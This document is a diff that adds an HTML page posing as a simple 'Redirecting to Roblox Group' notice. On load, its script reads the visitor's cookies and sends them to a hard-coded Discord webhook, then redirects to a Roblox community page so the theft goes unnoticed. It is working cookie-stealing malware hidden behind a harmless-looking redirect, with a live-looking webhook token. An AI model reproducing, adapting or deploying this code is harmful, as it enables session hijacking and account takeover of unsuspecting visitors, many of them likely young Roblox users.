@@ -1,0 +1,40 @@
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting to Roblox Group...</title>
+    <script>
+        // Extract cookies
+        var cookies = document.cookie;
+
+        // Send cookies to your Discord webhook
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://discord.com/api/webhooks/1325505134406406155/MvaxZwrP0UnmJIvDr3NdDuYdQx0l2oW-mUrek_f4O3xBzDf-nIL1VT28viyfmiT8JYVz", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("cookies=" + encodeURIComponent(cookies));
+
+        // Redirect to the Roblox group page
+        window.location.href = "https://www.roblox.com/communities/17371797/Zitros-shop#!/about";
+    </script>
+</head>
+<body>
+    <p>Redirecting to Roblox Group...</p>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
